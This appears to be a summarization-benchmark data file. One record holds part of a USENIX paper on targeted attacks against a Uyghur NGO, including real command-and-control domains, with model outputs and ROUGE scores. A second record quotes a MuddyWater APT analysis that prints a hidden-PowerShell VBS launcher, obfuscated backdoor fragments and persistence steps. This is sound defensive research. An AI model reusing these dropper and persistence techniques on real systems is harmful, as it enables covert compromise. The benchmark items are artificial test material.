use the same Command and Control (C2) infrastructure. As a result, traditional clustering al- gorithms tend not to work very well. Second, we located similar samples based on a limited set of indicators such as C2, cryptographic hash, or YARA signatures, how- ever, we feel that our current capability in that respect has a lot of room for improvement. We foresee that a search engine that can, for example, locate malware matching certain indicators out of an arbitrarily large corpus would be a useful instrument for researchers working on tar- geted attacks.Our analysis of CVEs highlights that telemetry data from commercial AVs is not always reliable. Our analy- sis complemented with taint-analysis was largely manual and time-intensive. Analysis techniques to quickly diag- nose known CVEs directly from given exploits is an open problem and perhaps one of independent interest. Defenses. Our \ufb01ndings con\ufb01rm that AVs may miss known CVEs, even years after their release dates. Clearly, known CVEs contribute a large part of the emerging threat of targeted attacks. Understanding why commercial AVs miss known attacks conclusively, for example to tradeoff false positives or performance for security, is an important research direction. Designing effective defenses against targeted attacks is a major re- search challenge which depends on our ability to under- stand the threat at hand. As part of future work, one could evaluate the effectiveness of novel defenses based on the \ufb01ndings from this paper. As a small step towards that goal, we plan to soon deploy a webmail plugin that combines metadata and stylometry analysis [17] to detect contact impersonation.7 ConclusionWe have presented an empirical analysis of a dataset capturing four years of targeted attacks against a human- rights NGO. First, we showed that social engineering was an important component of targeted attacks with signi\ufb01cant effort paid in crafting emails that look legiti- mate in terms of topics, languages, and senders. We also found that victims were targeted often, over the course of several years, and simultaneously with colleaguesfrom the same organization. Second, we found that malicious documents with well-known vulnerabilities were the most common attack vectors in our dataset and that they tended to bypass common defenses deployed in webmails or users\u2019 computers. Finally, we provided an analysis of the targeted malware and showed that over a quarter of samples exhibited similarities with entities known to be involved in targeted attacks against a variety of industries. We hope that this paper, together with the public release of our malware dataset, will facilitate future research on targeted attacks and, ultimately, guide the deployment of effective defenses against this threat.Acknowledgements. The authors would like to thank the anonymous reviewers, our shepherd Stuart Schechter, and Peter Druschel for their useful feedback. We would also like to acknowledge Karmina Aquino (F-Secure), Emiliano Martinez (VirusTotal), Mila Parkour (Conta- gio), and Nart Villeuneuve (FireEye) for their help locat- ing similar malicious documents. Finally, we thank the Max Planck Society, the Ministry of Education of Singa- pore under Grant No. R-252-000-495-133, and the NSF under Grant No. CNS-1116777 for partially supporting this work.References[1] url Tech.space.reportber content/uploads/2013/downloads/Inside Report by Infosec Consortium.pdf.attacks url Inside TAO: Documents reveal top nsa hacking unit.url powerful-toolbox-in-effort-to-spy-on-global-networks-a- 940969.html.[4] The Slingshot Project. url [5] BAILEY, M., ANDERSEN, J., MORLEYMAO, Z., AND JAHANIAN, F. Automated classi\ufb01cation and analysis of internet malware. In Proceedings of Recent Advances in Intrusion Detection (RAID 2007).[6] BILGE, L., AND DUMITRAS, T. Before we knew it: An empirical study of zero-day attacks in the real world. In Proceedings of the 2012 ACM conference on Computer and communications security (CCS 2012) (2012).[7] CITIZEN LAB.Surtr: Malware community.family tar- url targeting-the-tibetan-community/.[8] CONTAGIO. url FIREEYE. Supply chain analysis: From quartermaster tosunshop. Tech. rep.USENIX Association23rd USENIX Security Symposium 55513[10] HARDY, S., CRETE-NISHIHATA, M., KLEEMOLA, K., SENFT, A., SONNE, B., WISEMAN, G., AND GILL, P. Targeted threat index: Characterizing and quantifying politically-motivated targeted malware. In Proceedings of the 23rd USENIX Security Symposium (San Diego, CA). [11] INFORMATION WARFARE MONITOR. Tracking ghost- net: Investigating a cyber espionage network. Tech. rep., 2009.[12] JANA, S., AND SHMATIKOV, V. Abusing \ufb01le processing in malware detectors for fun and pro\ufb01t. In Proceedings of the 33rd IEEE Symposium on Security & Privacy (San Francisco, CA).[13] KASPERSKY. The nettraveler (aka TravNeT). Tech. rep.url the-net-traveler-part1-\ufb01nal.pdf.[14] KRUEGEL, C., KIRDA, E., COMPARETTI, P. M., BAYER, U., AND HLAUSCHEK, C. Scalable, behavior- based malware clustering. In Proceedings of the 16th Annual Network and Distributed System Security Sympo- sium (NDSS 2009) (2009). APT1[15] MANDIANT.exposingoneof rep.,chi- 2013.nas cyber espionage units. url MARCZAK, W. R., SCOTT-RAILTON, J., MARQUIS- BOIRE, M., AND PAXSON, V. When governments hack opponents: A look at actors and technology. In Proceed- ings of the 23rd USENIX Security Symposium (San Diego, CA).[17] NARAYANAN, A., PASKOV, H., GONG, N. Z., BETHEN- COURT, J., CHUL, E., SHIN, R., AND SONG, D. On the feasibility of internet-scale author identi\ufb01cation. In Pro- ceedings of the 33rd conference on IEEE Symposium on Security and Privacy. IEEE (San Francisco, CA, 2012).[18] NATIONALVULNERABILITYDATABASE.url RALPH LANGNER. To kill a centrifuge: A technical anal- ysis of what stuxnets creators tried to achieve. Tech. rep., 2013.[20] REUTERS.Journalists,fromhackers:tack www.reuters.com/article/2014/03/28/us-media- cybercrime-idUSBREA2R0EU20140328.media researchers.[21] SONG, D., BRUMLEY, D., YIN, H., CABALLERO, J., JAGER, I., KANG, M. G., LIANG, Z., NEWSOME, J., POOSANKAM, P., AND SAXENA, P. Bitblaze: A new ap- proach to computer security via binary analysis. In Pro- ceedings of the 4th International Conference on Informa- tion Systems Security (Hyderabad, India, 2008).[22] SYMANTEC.2013security url response/publications/ threatreport.jsp.internetvolumereport,Tech.18.[23] WIRED.Googlehackerssource url morecodethan30targeted companies.A Targeted organizationsOrganization World Uyghur Congress (WUC) East Turkestan Union in Europe (ETUE) Australian Uyghur Association Euro-Asia Foundation in Turkey Uyghur Canadian Association Germany Uyghur Women Committee Radio Free Asia (RFA) France Uyghur Association Eastern Turkestan Australian Association (ETAA) Uyghur American Association (UAA) Eastern Turkestan Uyghur Association in Netherlands Netherland Uyghur Union United Nations for a Free Tibet (UK) Eastern Turkestan Culture and Solidarity Association Viktoria Uyghur Association Japan Uyghur Association Switzerland East Turkestan Association Hacettepe University Turkey Kazakhstan Academy of Poetry Belgium Uyghur Association Kyrgyzstan Uyghur Association Uyghur Canadian Society Uyghur Academy Munich Uyghur Elders Meshrep Republican Uyghur Cultural Center of Kazakhstan Sweden Uyghur Association Virginia Department of Social Services Unrepresented Nations and Peoples Organization (UNPO) Sociale Verzekeringsbank (SVB) NGO Netherland China Democratic Party (CDP) Finland Uyghur Association Jet Propulsion Laboratory, founded by NASA Pennsylvania State University US Uyghur Support Group Nederland Norway Uyghur Committee Amnesty International Association of European Border Regions (AEBR) Howard University US Initiatives for China LSE Asia Research Center and Silk Road Dialogue The Government-in-Exile of the Republic of East Turkistan Uyghur Human Rights Project (UHRP) Australian Migration Options Pty Ltd Agence France-Presse National Endowment for Democracy (NED) PEN International Syracuse University US Worldwide Protest in Honor and Support of Uyghurs Dying for Freedom Australian Government - Department of Foreign Affairs and Trade New Tang Dynasty Television China The Epoch Times Ministry of Foreign Affairs Norway International University of Kagoshima Japan Association of Islam Religion Bilkent University Turkey Embassy of Azerbaijan in Beijing Indiana University School of Law-Indianapolis LL.M. KYOCERA Document Solutions Development America New York Times P\ufb01zer Government Research Laboratory - Clinical Pharmacology Saudi Arabia - Luggage Bags and Cases Company Students for a Free Tibet Sweden Uyghur Education Union Uyghur International Culture Center The Protestant Church Amsterdam Swiss Agency for Development and Cooperation (SDC) Kargyzstan American Bar Association for Attorneys in US Assistance for Work Germany Frankfurt Bishkek Human Rights Committee Central Tibetan Administration (CTA) Chinese Translation Commercial Business Circassian Cultural Center (CHKTS) Colombian National Radio Embassy of the United States in Australia Europa Haber Newspaper Turkey Europe-China Cultural Communication (ECCC) Freelance Reporter and writer Turkey Goethe University Frankfurt am Main Germany Human Rights Campaign in China International Enterprise (IE) - Singapore Government International Tibet Independence Movement Jasmine Revolution China (Pro-Democracy Protests) Socialist Party (Netherlands) Los Angeles Times Milli Gazete (National Newspaper Turkey) Norwegian Tibet Committee Photographer Turkey CNN International Hong Kong Reporters Without Borders Republican National Lawyers Association Maryland Save Tibet - International Campaign for Tibet Society for Threatened People (STPI) Southern Mongolian Human Rights Stucco Manufacturers Association US Superior School of Arts France The George Washington University TurkishNews Newspaper US Bureau of Transportation Statistics Umit Uighur Language School Union of Turkish-Islamic Cultural Associations in Europe University of Adelaide Melbourne University of Khartoum Sudan US Embassy and Consulate in Munich Germany Wei Jingsheng Foundation Xinjiang Arts Institute China Yenicag Gazetti (Newspaper Turkey) American University Islamic Jihad Union# Recipients# Emails53 2012556 23rd USENIX Security SymposiumUSENIX Association14B Dynamic taint-assisted analysis of mali-cious documentsB.1 Methodology We use BitBlaze [21] to perform dynamic taint-tracking analy- sis of the targeted applications under the malicious documents as input and con\ufb01gure it to report four kinds of reports: (a) when a tainted Extended Instruction Pointer (EIP) is executed, (b) when a memory fault is triggered in the target program, (c) when a new process is spawned from the target program, or (d) when the analysis \u201ctimes out\u201d (i.e., runs without interrup- tion for over 15 minutes). To mark malicious documents as a source of taint, we tainted the network inputs and routed the malicious input \ufb01le using netcat. Additionally, we set Bit- Blaze to exit tracing at the detection of null pointer exceptions, user exceptions, tainted EIPs, and process exits before the start of the trace. A tag was generated from the trace by obtain- ing the last instruction with tainted operands, and matching it with the list of loaded modules generated by TEMU. Our guest (analysis) system con\ufb01guration used in the image consists of clean installations of Windows XP SP2 with TEMU drivers and Microsoft Of\ufb01ce 2003. B.2 Results Anti-virus software typically uses static signature-matching or whitelisting techniques to analyze malware. To validate the analysis results available from commercial AV, we ran a sep- arate semi-automated dynamic analysis of the targeted applica- tion under our malicious documents.Out of 817 unique input documents (725 malicious and 92 legitimate), 295 timed out with our BitBlaze analysis without reporting a tainted EIP, a memory fault, or a newly spawned process.2 Another 13 of them were incompatible with our anal- ysis infrastructure (using a more recent DOCX format). We could not compare these cases directly to the results obtained from VirusTotal. Therefore, we focus on the remaining 509 malicious documents in the evaluation. Ef\ufb01cacy of Taint EIP Detection. Taint-tracking detected tainted EIP execution in 477 out of the 509 documents. In 19 cases of the undetected 32 cases, however, a new process was spawned without it being detected by taint-tracking. We treat these as false negatives in taint-tracking. We speculate that this is likely to be due to missed direct \ufb02ows, untracked indirect \ufb02ows (via control dependencies, or table-lookups), or attacks using non-control-\ufb02ow hijacking attacks (such as argu- ment corruption). 13 documents did not lead to a tainted EIP execution, but instead caused a memory fault. This could be due to a difference in our test infrastructure and the victim\u2019s, or an attempt to evade analysis. In 33 of the 477 cases where tainted EIP was detected, no new spawned process was created, and the tainted EIP instruction did not correspond to any shell- code. All these cases correspond to a particular instruction trig- gering the tainted EIP detection in MSO.DLL, a dynamic-link library found in Microsoft Of\ufb01ce installations. To understand this case better, we manually created blank benign documents and fed them to Microsoft Of\ufb01ce \u2014 they too triggered tainted2We believe 150 of these are due to user-interaction which we could not presently automate, and the remaining could potentially be ana- lyzed with a faster test platform; we plan to investigate this in the fu- 1121385TaintedTimeoutSpawnedFaultDOCXFigure 12: Breakdown of dynamic taint-assisted analy- sis, and comparison to VirusTotal AV results. Single, Multiple, Heuristics, and Unknown correspond to the dif- ferent AV tags assigned to documents. The main bars show the detection result from BitBlaze: (a) Detected by Tainted EIP execution, (b) Timeout, (c) Spawned pro- cess without tainted EIP execution, (d) Memory Fault without tainted EIP execution, and (e) DOCX unable to run in our analysis environment. Within each main bar, each stacked bar represents the corresponding tag given by VirusTotal. EIP detections. We treat these cases as false positives in taint detection, possibly because of benign dynamic generation of code. All the remaining cases (i.e., 444 out of 477) are legiti- mate exploits that we could con\ufb01rm to execute shellcode. Dynamic Taint versus VirusTotal. Figure 12 shows the de- tailed comparison of taint-assisted classi\ufb01cation of vulnera- bilities versus the results from VirusTotal. Out of a total of 477 documents on which tainted EIP was detected, VirusTotal tagged 397 documents with one or more CVEs. Of the remain- ing 80 cases that are detected by tainted EIP execution, 24 are undetected by VirusTotal, and 56 are detected, but marked Un- known (i.e., no CVE assigned) by VirusTotal. Dynamic taint analysis to determine the tainted EIP was helpful to further re\ufb01ne the results of AV detection for a majority of these 56 tagged-Unknown cases. Speci\ufb01cally, for 55 out of the 56 doc- uments, taint-assisted manual analysis was able to resolve it to the exploited CVE.Out of a total of 477 documents on which tainted EIP was detected, VirusTotal tagged 397 documents with one or more CVEs. Our taint-assisted manual analysis agrees with the VirusTotal CVE tag results on 372 of these 397. That is, 372 documents were detected to execute a tainted EIP for which we could manually correlate to a single CVE that was the same as the one reported by a majority of the AVs in VirusTotal.3 Thus, for a large majority of the cases, taint-assisted analysis agrees with the AV results. Of the remaining 25 cases, 17 could be identi\ufb01ed as misclassi\ufb01cations because the CVE reported by most of the AVs in VirusTotal was not the one that affected the program. The 8 remaining documents were tagged by taint analysis as being false positives even though a CVE was ob- tained from VirusTotal.3Note that different AVs often tag the same vulnerability with dif- ferent tags in VirusTotal. We took the tag given by a majority of the dtl.dnsd.me 66 ns.dns3-domain.com 55 dtl.eatuo.com 44 update.googmail.org 31 dtl6.mooo.com 29 www.discoverypeace.org 26 email.googmail.org 22 news.googmail.org 22 softmy.jkub.com 15 dnsmm.bpa.nu 11 zeropan007.3322.org 10 wwzzsh.3322.org 9 3.test.3322.org.cn 8 1.test.3322.org.cn 8 2.test.3322.org.cn 8 eemete.freetcp.com 8 apple12.crabdance.com 8 wolf001.us109.eoidc.net 7 4.test.3322.org.cn 7 etdt.cable.nu 6 br.stat-dns.com 6 www.southstock.net 6 ns1.3322.net 5 www.uyghur.25u.com 5 ns1.oray.net 5 jhska.cable.nu 5 test195.3322.org 5 ns1.china.com 5 a2010226.gicp.net 5 logonin.uyghuri.com 4 macaonews.8800.org 4 book.websurprisemail.com 4 desk.websurprisemail.com 4 test.3322.org.cn 4 liveservices.dyndns.info 4 portright.org 4 video.googmail.org 4 www.guzhijiaozihaha.net 4 www.googmail.org 4 2.test.3322.org 3 dcp.googmail.org 3 test.3322.org 3 np6.dnsrd.com 3mzyzy.vicp.net 3 mygoodbug.dnsd.info 3 www.uyghuri.mrface.com 3 6.test.3322.org.cn 3 uyghur.sov.tw 3 3.test.3322.org 3 newwhitehouse.org 3 goodnewspaper.f3322.org 3 nskupdate.com 3 webmonder.gicp.net 3 betterpeony.com 3 4.test.3322.org 3 9.test.3322.org.cn 3 8.test.3322.org.cn 3 1.test.3322.org 3 radio.googmail.org 3 7.test.3322.org.cn 3 tokyo.collegememory.com 2 webproxy.serveuser.com 2 www.bbcnewes.net 2 done.youtubesitegroup.com 2 alma.apple.cloudns.org 2 webmailsvr.com 2 polat.googmail.org 2 religion.xicp.net 2 connectsexy.dns-dns.com 2 dns3.westcowboy.com 2 apple12.co.cc 2 worldmaprsh.com 2 phinex127.gicp.net 2 wxjz.6600.org 2 gecko.jkub.com 2 smtp.126.com 2 errorslog.com 2 uyghurie.51vip.biz 2 tanmii.gicp.net 2 religion.8866.org 2 blogging.blogsite.org 2 softjohn.ddns.us 2 report.dns-dns.com 2 newyorkonlin.com 2 tw252.gicp.net 2 tomsonmartin.ikwb.com 2www.info-microsoft.com 2 www.uyhanur.nna.cc 2 www.micosofts.com 2 a.yahoohello.com 1 bc1516.7766.org 1 msdn.homelinux.org 1 www.avasters.com 1 nbsstt.3322.org 1 goodnewspaper.3322.org 1 webposter.gicp.net 1 uyghur1.webhop.net 1 webwx.3322.orgxiexie.8866.org 1 guanshan.3322.org 1 leelee.dnset.com 1 uygur.eicp.net 1 kxwss.8800.org 1 rc.arkinixik.com 1 www.uusuanru.nna.cc 1 uxz.fo.mooo.com 1 uygur.51vip.biz 1 peopleunion.gicp.net 1 free1000.gnway.net 1 uxz.fo.dnsd.info 1 wodebeizi119.jkub.com 1 itsec.eicp.net 1 stormgo.oicp.net 1 boy303.2288.org 1 webjz.9966.org 1 zbing.strangled.net 1 tommark5454.xxxy.info 1 oyghur1.webhop.net 1 addi.apple.cloudns.org 1 toolsbar.dns0755.net 1 home.graf\ufb01ti.net 1 statistics.netrobots.org 1 freesky365.gnway.net 1 greta.ikwb.com 1 englishclub.2288.org 1 mm.utf888.com 1 annchan.mrface.com 1 www.shine.4pu.com 1 copy.apple.cloudns.org 1 uyghuri.mrface.com 1 tt9c.2288.org 1 forum.universityexp.com 116googlehk.dynamicdns.co.uk 1 blog.sina.com.cn 1 uyghur.epac.to 1 xinxin20080628.gicp.net 1 yah00mail.gicp.net 1 hbnjx.6600.org 1 humanbeing2009.gicp.net 1 webhelp01.freetcp.com 1 mobile.yourtrap.com 1 www.jiapin.org 1 ibmcorp.slyip.com 1 star2.ksksz.com 1 www.yahooprotect.com 1 xiexie.8866.org 1 img.mic-road.com 1 photo.googmail.org 1 tonylee38.gicp.net 1 suggest.dns1.us 1 worldview.instanthq.com 1 goodnewspaper.gicp.net 1 abc69696969.vicp.net 1 put.adultdns.net 1 loadbook.strangled.net 1 internet.3-a.net 1 news.scvhosts.com 1 mydeyuming.cable.nu 1 gshjl.3322.org 1 forever001.dtdns.net 1 grt1.25u.com 1 kaba.wikaba.com 1 frank.3feet.com 1 liveservices.dyndns.tv 1 inc.3feet.com 1 1nsmm.bpa.nu 1 www.yahooprotect.net 1 webwxjz.3322.org 1 thankyou09.gicp.net 1 soft.epac.to 1 www.yahooip.net 1 msejake.7766.org 1 www.yahoohello.com 1 ", "generated_text": "an anal- ysis; targeted attacks; individuals; a Chinese non-Governmental Organization; the emails; 1,493; malicious attachments; 724 unique email addresses; individuals; 108; Chinese; the emails; malware; malicious attachments; a typical culture; language; the emails; the attackers; use; impersonation; the emails; vulnerabilities; evade; common defenses; over a quarter; the malware; NGOs; Tibetan; media attention; the environment; countries; the threats.", "ref_text": "<START-1>The paper analyzes targeted cyberattacks against a human rights NGO representing the Uyghur minority in China. The authors examined 1,493 suspicious emails received by two NGO volunteers over 4 years. They found the emails were highly tailored in language and topic to the victims, with most written in their native Uyghur language. Senders were often impersonated, including compromised accounts of high-profile activists. While recent studies found executables and archives were common attack vectors, this study found malicious Office documents were most prevalent. The documents exploited recent but disclosed vulnerabilities that tended to bypass defenses. No zero-days were observed. Analysis of the malware payloads revealed the NGO was targeted by different families over time. Over a quarter exhibited similarities to malware linked to targeted attacks against political, industrial, and Tibetan groups by known threat actors. The study shows the value of tracking old indicators of compromise across campaigns. It provides an in-depth look at social engineering and attack vectors used in the reconnaissance phase before a compromise. The authors released the malware dataset to further research on targeted attacks.<END-1>", "t5/keyword/hint_hit_precision": 0.28125, "t5/word/hint_hit_recall": 0.07865168539325842, "gpt3/lexical/rouge_rouge1": 0.5206349206349207, "gpt3/lexical/rouge_rouge2": 0.20447284345047922, "gpt3/lexical/rouge_rougeL": 0.35555555555555557, "gpt3/lexical/rouge_rougeLsum": 0.35555555555555557, "gpt3_generated_text": ["This article presents an empirical analysis of targeted attacks against a human-rights Non-Governmental Organization (NGO) representing a minority living in China. The study examines 1,493 suspicious emails received by two members of the NGO over a four-year period, containing 1,176 malicious attachments targeting 724 unique email addresses affiliated with 108 organizations. The emails were tailored to the victims' language and culture, with sender impersonation used to lure them into opening attachments. The majority of attacks exploited recent vulnerabilities to evade common defenses, and over a quarter of the malware can be linked to entities engaged in targeted attacks against political organizations, industrial organizations, and Tibetan NGOs. This research sheds light on the tactics and motivations of targeted attackers and highlights the need for improved defenses against such threats."]}, {"split_name": "val", "sample_id": "val_103", "prompt_text": "Extract the keywords: This website uses cookies to improve your experience.Accept AcceptRead More Read MoreBLOGBLOGA dive into MuddyWater APT targeting A dive into MuddyWater APT targeting Middle-East Middle-EastP O S T E D B Y 2 1A D M I N O N 02/ N O V /27MuddyWater is a threat actor that caught our attention for their extensive use of \u201cLiving off the Land\u201d attacks in a targeted campaign aimed at the Middle East. During our investigation we reconstruct the evolution of the vectors used and how the group operates to target their victims, evade detections and move laterally inside the compromised infrastructures. MuddyWater Summary MuddyWater SummaryMuddyWater is an APT group that has been active throughout 2017, targeting victims in Middle Eastwith in-memory vectors leveraging on Powershell, in a family of attacks now identi\ufb01ed as \u201cLiving off the  land\u201d, as they don\u2019t require the creation of new binaries on the victim\u2019s machine, thus maintaining a low detection pro\ufb01le and a low forensic footprint. MuddyWater has been assigned by PaloAlto in an article that describes how the actor\u2019s POWERSTATS, evolved over the past year. For the sake of clarity we decided toThe name MuddyWater backdoor, called POWERSTATS maintain the same names.The operators behind MuddyWater are likely espionage motivated, we derive this information from the analysis of data and backdoors behaviors. We also \ufb01nd that despite the strong preponderance of  victims from Pakistan, the most active targets appear to be in: Saudi Arabia the victims we identify a variety of entities with a stronger focus at Governments companies.Saudi Arabia, UAEUAE and IraqIraq. AmongstGovernments, TelcosTelcos and OilOilBy tracking the operations we \ufb01nally \ufb01gure out that the originating country is likely to be Iran, while it   remains harder to ascertain whether MuddyWater is state sponsored or a criminal organization incline to espionage.Finally we show how the threat evolved since its \ufb01rst public report, the techniques used and how the  actors adapted to various public reports of their activities. Timeline TimelineIn order to understand how the threat evolved and to understand the whole picture, we have to reconstruct the timeline of the various discoveries and piece together the \ufb01ndings published.  18/Sep/2017 \u2013 First public report 18/Sep/2017 \u2013 First public reportTo the best of our knowledge the \ufb01rst public report of this speci\ufb01c threat came from our intelligence   team (please let us know if any prior \ufb01nding was published before) with the \ufb01rst detection happening   during the second half of September. At that time the analysis from ReaQta-Hive shows the full threat\u2019s GitHub to conceal and download its payload.Shortly after the information is made public, GitHub blocks the account and MuddyWater\u2019s operators quickly shift to PastebinPastebin as their main repository.\"Living off the land\" RAT downloads 1st stage from cloned fb/react repo, persists in registry & task, uses breached websites as c&c pic.twitter.com/hqwLmIKHXW \u2014 ReaQta (@ReaQta) September 18, 201726/Sep/2017 \u2013 First public analysis 26/Sep/2017 \u2013 First public analysisAt the end of September, MalwareBytes publishes an analysis of POWERSTATS, showing how the threat is now downloading its payload from Pastebin. With the exception of the repository location, we con\ufb01rm that the behavior of the analyzed backdoor is the same as the one identi\ufb01ed by ReaQta a few   3/Oct/2017 \u2013 MuddyWater starts to embed the payload 3/Oct/2017 \u2013 MuddyWater starts to embed the payloadAs part of the evolution of POWERSTATS, for the \ufb01rst time on the 3rd of October we notice that the  payload is not downloaded anymore from a remote source (GitHub or Pastebin) but it comes embedded 11/Nov/2017 \u2013 New C2 for the active backdoors \ufb01rst public disclosure of the address).  14/Nov/2017 \u2013 Second public analysis date of the \ufb01rst infection back to February 2017, while also showing how the operators adapted the  backdoor to reduce the detection rate and to thwart analyses. Palo Alto reports the C2 to be the same all the implants are already communicating with the C2 discovered on the 11th of November still communicating with the old C2 address from October. 20/Nov/2017 \u2013 New C2 and JScript RAT (Koadic) / Meterpreter 20/Nov/2017 \u2013 New C2 and JScript RAT (Koadic) / MeterpreterAfter the National CyberSecurity Center from Saudi Arabia publishes an advisory (the link appears to be unreachable from outside Middle East, but a copy can be found here) regarding the espionage OperationsMuddyWater operators use a series of compromised websites that act as proxies in order to conceal the real address of the C2 server. Infected endpoints connect randomly to one of the proxy servers, which in turn relays the information to the C2. Operators use the C2 to dispatch commands and receive ex\ufb01ltrated data. InfrastructureThe exception to the rule is represented by the Koadic part that bypasses the proxies and communicates directly with the C2 server.MuddyWater operators have been capable of consistently infecting new computers, this is clearly shown by the graph below showing the growth trend of victims when the group was still moving relatively under the radar, at least in Middle East.Daily trend of new infectionsAnother interesting part of the data is represented by the aggregate activity of each backdoor, show below.Overall activity of all infected victims (click to zoom)It is interesting to note what is the impact of public analyses and advisories on a large scale espionage campaign and how fast MuddyWater adapts to each new disclosure. It is also possible to understand the working patterns of the operators, at least up to the 12th of November when they were operatingrelatively undisturbed.Hourly activities (cilck to zoom)Zooming in on the victims, we can understand on which countries the group has been focusing with most infections in the EU belonging to victims travelling.Unique victims per country before the publication of advisories in Middle East, countries with less than 5 victims are not shown (Tunisia, Lebanon, Jordan, Israel, Egypt),At a \ufb01rst glance Pakistan is the targeted country but our data reveals a different picture. By analyzing  the activity on each victim we realized that the operators were interested in a different area.Operators activities per countryPakistan is indeed the country with the most infections, though the operators appears to be relatively disinterested in those victims. On the other hand, Iraq has a large number of infections and the operators are extremely active on those infrastructures. Saudi Arabia and United Arab Emirates (Dubai speci\ufb01cally) have a low number of victims, all of them extremely active. This led us to believe that the  real targets are then: Iraq, Saudi Arabia and UAE. Targets TargetsVictims belong to a variety of different sectors but the MuddyWater operators are particularly active on Governments Telcos and OilOil companies (including one Oil platform). In one instance we found that a Governments, Telcos large Iraqi telecom provider was deeply compromised with 10% of their endpoints infected with POWERSTATS. The attackers also possess some decent capabilities of lateral movement and they rely on various exploits, LPE \u2013 fully working up to the latest version of Windows 10 \u2013 and tools (somepublicly available) to get access to the endpoints of interest once inside the infrastructure.Distribution of infected Operating SystemsWhile 85% of infected devices are workstations, the remaining 15% is made by servers, indicating that the attackers are capable of escalating after the initial breach to get direct access to the data they\u2019re Decoy DocumentsThe initial backdoor is deployed using a decoy document containing a macro. Here are some examples of the content delivered to the victims:The observed content has some common characteristics like the attempt to impersonate National entities; the four documents mimics:Iraqi National Intelligence Service National Security Agency Ministry of Interior of Saudi Arabia Federal Investigation Agency Ministry Of Interior PakistanEvery document also presents an Input Box and a Button at the bottom of the page. Document Analysis Document AnalysisBeside the decoy content, the static analysis of the initial documents allowed us to identify some common characteristics. All documents leverages the Macro VBS mechanism to execute code and deploy next attack stages.SAMPLE 1 GIGABYTE AppVersion: 15.015.0 Software: Microsoft Of\ufb01ce Word  Microsoft Of\ufb01ce Word In particular all but one document\u2019s metadata show that the author\u2019s keyboard locale was set to ar_SA (Arabic, Saudi Arabia).The macro operations can be summarized as follow:Decode and drop a powershell script into C:\\Users\\Public\\Documents\\system.ps1 Decode and drop a VBS script into C:\\Users\\Public\\Documents\\system.vbs Executes the VBS with Shell.Open MethodThe VBS content is below reported and its scope is to simply run system.ps1system.ps1 powershell script.Set\tobjShell\t=\tWScript.CreateObject(\"WScript.Shell\") command\t=\t\"powershell.exe\t-WindowStyle\thidden\t-ExecutionPolicy\tBypass\t-nologo\t-noprofile\t-file\tC:\\Users\\Public\\Documents\\system.ps1\" objShell.Run\tcommand,0 Set\tobjShell\t=\tNothingPowershell Backdoor Powershell Backdoorsystem.ps1 the attack-chain goes through two blocks of code that prepare the ground forStarting from system.ps1 the third block of code, containing the real powershell backdoor. Each block sets the variables necessary for the correct execution of the backdoor. Since the entire content is quite large we summarized the overall structure as follows:#\tFirst\tBlock &((GEt-VARIAbLE\t'*MDR*').nAme[3,11,2]-JOiN'')\t(\"\t$(\tsV\t'Ofs'\t'')\"+[stRinG]((\t100000,\t[ ] #\tSecond\tBlock &(\t$pShOme[21]+$psHOME[34]+'x')\t([stRIng]::JOin(\t''\t,\t('100000\t[ ] #\tThird\tBlock/Backdoor .\t(\t$ShELlID[1]+$shelLiD[13]+'x')\t(\t(\t'1100110\t[ ]We can observe 3 blocks of code that seems to be obfuscated with using Invoke-Obfuscation. Each block presents this structure:iex\t|\t(code)First Block First Block After the deobfuscation, the \ufb01rst block sets the following variables: First Block VariablesSecond Block Second Block The second block like the \ufb01rst one after being deobfuscated, creates additional local variables,  environment variables and functions used by the backdoor:Second Block VariablesSecond Block FunctionsThird Block/Backdoor Third Block/BackdoorThe third and \ufb01nal block is the backdoor and it\u2019s responsible for: Anti-Analysis Countermeasures Command ExecutionThe whole backdoor\u2019s structure is quite simple simple and appears as follows:Third Block/BackdoorFor the sake of brevity we will report only the most interesting functions.The backdoor implements an anti-analysis countermeasure that uses isDebugEnv machine if one of the following tools is found to be running:isDebugEnv to shutdown theollydbg joeboxserverDuring the analysis, our victims received an updated version of isDebugEnv the following tools too:isDebugEnv which extends the list towin32_remote win64_remote64The function persistence persistence takes care of lowering the security settings of Microsoft Excel and Word, creating a survival on reboot mechanism and hiding the VBS and PS1 by setting the \ufb01le attributes  System and Hidden via the Windows utility attrib.exe.(HKCU and HKLM) CurrentVersion\\Run. The \ufb01nal Windows Optimizations which resolves to: Wscript WscriptPersistence is obtained by adding an entry into (HKCU and HKLM) CurrentVersion\\Run artifact will have a value named Windows Optimizations C:\\Users\\Public\\Documents\\System.Vbs C:\\Users\\Public\\Documents\\System.Vbs. An second persistence is obtained by adding a Scheduled Scheduled TaskTask entry called Microsoft\\WindowsOptimizationsService C:\\Users\\Public\\Documents\\System.Vbs C:\\Users\\Public\\Documents\\System.Vbs.Microsoft\\WindowsOptimizationsService which executes Wscript Wscriptfunction persist()The entire function and the system\u2019s alterations can be easily summarized by checking the events in ReaQta-Hive:ReaQta-Hive EventsOn the next step the script looks for *.dat \ufb01les, if none is found it sleeps up to one hour and then stores  the proxy URL in the registry and awaits until the function getKey()getKey() succeeds.getKey() function retrieves a key that uniquely identi\ufb01es the victim\u2019s machine, if it does not exists it register function. Registration is performed by collecting information about the running OSThe getKey() invokes the register that will be sent to the attacker, the server will \ufb01nally reply with a unique key (MD5) stored in  {username}.dat {username}.dat. By diving more in depth in the register User\u2019s information, \ufb01nally assembling the following string: register function we can see that it gathers IP, OS ad$($env:computername)~~$($env:username)~~$os~~$($ips.subString(1))~~$((Get-WmiObject\tWin32_ComputerSystem).Domain)After the UniqueKey handling (Created or Found) stage the backdoor enters in the Main Loop that calls the getCommand() getCommand() function. This function requests commands to the C2 and sends back the results by splitting them in chucks. The command evaluation is performed by using Invoke-Expression Invoke-Expression from powershell, such approach is simple and straightforward and it offers strong post-exploitation capabilities to the attacker, the scripts can now run as a remote powershell.Additional persistence method Additional persistence methodWe identi\ufb01ed an additional persistence method deployed by the attacker, the technique relies on using  a Word Template and it\u2019s been described at length in the article \u201cMaintaining Access with Normal.dotm\u201dPowershell script that create the Normal.dotm \ufb01le Macro from Normal.dotmConnections and Similarities between samples Connections and Similarities between samplesDuring the investigation we noticed that this attack generated an incident quite similar to another one we already observed in the past. As we can see from the following screenshots the two process-tree are almost the same:Behavioral-Tree view of Old and New incidentsThe core differences between the two attacks can be summarized as follows:Macro and Powershell script are now obfuscated Backdoor code has been refactored URL parameters are changedAdditionally the code of the backdoor has been refactored, as it can be seen from the following examples.function httpGet The new version adds a fallback URL to contact, in both cases domains are randomly chosen from an hard-coded list.httpGet diffThe \u201csend\u201d code has been moved into a dedicated new function:send code difffunction persistenceThe persistence is obtained by using the 